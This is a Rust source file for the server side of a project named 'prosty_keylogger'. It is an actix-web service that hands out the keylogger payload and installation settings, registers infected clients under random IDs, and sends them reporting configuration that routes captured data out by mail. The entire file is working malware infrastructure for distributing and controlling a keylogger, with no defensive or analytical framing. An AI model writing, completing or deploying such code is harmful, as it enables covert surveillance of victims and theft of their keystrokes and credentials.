use std::path::PathBuf;
use actix_web::{App, get, HttpResponse, HttpServer, post, Responder, web};
use clap::Parser;
use log::info;
use rand::{Rng, thread_rng};
use prosty_keylogger::common::{InstallConfiguration, PathFragment, PersonalData, ReportConfig, setup_logger, TaskConfiguration};
use crate::options::Args;

mod options;

struct AppState{
    pub config: TaskConfiguration,
    pub client_file_path: PathBuf,
    //pub installer_file_path: PathBuf,
    pub install_config: InstallConfiguration,
    //pub rng: rand::rngs::ThreadRng,
}

#[get("/client")]
async fn download_client(data: web::Data<AppState>) -> actix_web::Result<actix_files::NamedFile> {
    info!("Client asks to download payload: {:?}", data.client_file_path);
    let path = &data.client_file_path;
    Ok(actix_files::NamedFile::open(path)?)

}
/*
#[get("/download_installer")]
async fn download_installer(data: web::Data<AppState>) -> actix_web::Result<actix_files::NamedFile> {
    info!("Client asks to download installer");
    let path = &data.installer_file_path;
    Ok(actix_files::NamedFile::open(path)?)

}

 */

#[post("/install")]
async fn installation(info: web::Json<PersonalData>, data: web::Data<AppState>)-> impl Responder{
    info!("Received installation request");
    let install_config = &data.install_config;
    let config_json = serde_json::to_string(&install_config).unwrap();
    HttpResponse::Ok().body(config_json)

}


#[post("/hello")]
async fn register_and_send_config(info: web::Json<PersonalData>, data: web::Data<AppState>) -> impl Responder{
    let mut d = data.config.clone();
    let mut rng = thread_rng();
    d.id = rng.sample(rand::distributions::Uniform::new(0, u64::MAX));
    match d.report_config{
        ReportConfig::Mail(ref mut mail_config) => {
            let mut s = String::new();
            if let Some(name) = &info.name{
                s += name;
                s += " "
            }
            if let Some(surname) = &info.last_name{
                s += surname;
                s += " ";
            }
            s += &mail_config.mail_from;
            mail_config.mail_from = s;

            info!("Client hello {:?}", &d);
            let config_json = serde_json::to_string(&d).unwrap();


            //let json = serde_json::to_string(&config).unwrap();
            HttpResponse::Ok().body(config_json)
        }
    }




}


#[get("/")]
async fn send_basic_config(data: web::Data<AppState>) -> impl Responder {
    let mut task_configuration = data.config.clone();

    let mut rng = thread_rng();
    task_configuration.id = rng.sample(rand::distributions::Uniform::new(0, u64::MAX));

    let config_json = serde_json::to_string(&task_configuration).unwrap();

    info!("Registered client {:?}", &task_configuration);

    //let json = serde_json::to_string(&config).unwrap();
    HttpResponse::Ok().body(config_json)
}
#[actix_web::main]
async fn main() -> anyhow::Result<()>{

    setup_logger(log::LevelFilter::Debug)?;

    let args = Args::parse();

    let config = TaskConfiguration::from(&args);
    //let config_json = serde_json::to_string(&config);



    Ok(HttpServer::new(move || {
        App::new()
            .app_data(web::Data::new(AppState{
                client_file_path: args.host_file.clone(),
                //installer_file_path: args.installer_file.clone(),
                config: config.clone(),
                install_config: {
                    let mut c = InstallConfiguration::default();
                    if let Some(url) = &args.config_server_address{
                        c.server_url = url.clone();
                    }
                    c
                },

            }))
            .service(send_basic_config)
            .service(register_and_send_config)
            .service(download_client)
            .service(installation)
            //.service(download_installer)

    })
        .bind(("0.0.0.0", 8080))?
        .run()
        .await?
    )
}